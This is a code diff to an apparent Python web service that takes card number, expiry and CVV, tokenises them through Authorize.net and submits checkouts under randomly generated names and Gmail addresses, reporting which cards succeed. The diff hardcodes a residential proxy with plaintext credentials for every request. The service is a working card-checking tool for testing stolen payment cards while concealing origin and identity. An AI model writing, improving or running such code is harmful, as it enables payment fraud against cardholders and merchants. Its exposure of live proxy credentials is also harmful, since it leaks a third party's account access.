@@ -14,11 +14,9 @@ def random_name():
     return faker.name()
 
 def random_gmail():
-    # Ensures unique emails and more variability
     user = faker.user_name() + str(random.randint(1000, 99999))
     return f"{user}@gmail.com"
 
-# === Original token generation ===
 def get_token(card, month, year, cvv, zip_code, name, proxies):
     url = 'https://api2.authorize.net/xml/v1/request.api'
     headers = {
@@ -51,7 +49,6 @@ def get_token(card, month, year, cvv, zip_code, name, proxies):
     json_data = json.loads(r.content.decode('utf-8-sig'))
     return json_data["opaqueData"]["dataValue"]
 
-# === Original checkout logic ===
 def send_to_checkout(token, name, email, proxies):
     fields = {
         'nam': name,
@@ -90,12 +87,10 @@ def send_to_checkout(token, name, email, proxies):
         timeout=180
     )
 
-    # try to parse JSON and extract error message
     try:
         parsed = json.loads(r.text)
         msg = parsed.get("error", "Success")
     except Exception:
-        # if not JSON, fallback to status text
         if r.status_code == 200:
             msg = "Success"
         else:
@@ -106,18 +101,13 @@ def send_to_checkout(token, name, email, proxies):
 def process():
     start_time = time.time()
     cc = request.values.get("cc")
-    proxy = request.values.get("proxy")
+
+    # Always use your proxy
+    proxy_string = "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888"
+    proxies = {"http": proxy_string, "https": proxy_string}
 
     if not cc:
         return jsonify({"error": "Missing cc parameter"}), 400
-
-    # default proxy
-    proxies = {
-        "http": "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888",
-        "https": "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888"
-    }
-    if proxy:
-        proxies = {"http": proxy, "https": proxy}
 
     try:
         card, mm, yy, cvv = cc.strip().split("|")
@@ -125,7 +115,7 @@ def process():
         return jsonify({"error": "Invalid CC format", "detail": str(e)}), 400
 
     name = random_name()     # New random name every request
-    email = random_gmail()   # New random gmail every request
+    email = random_gmail()   # New random Gmail every request
     amount = 10
 
     try:
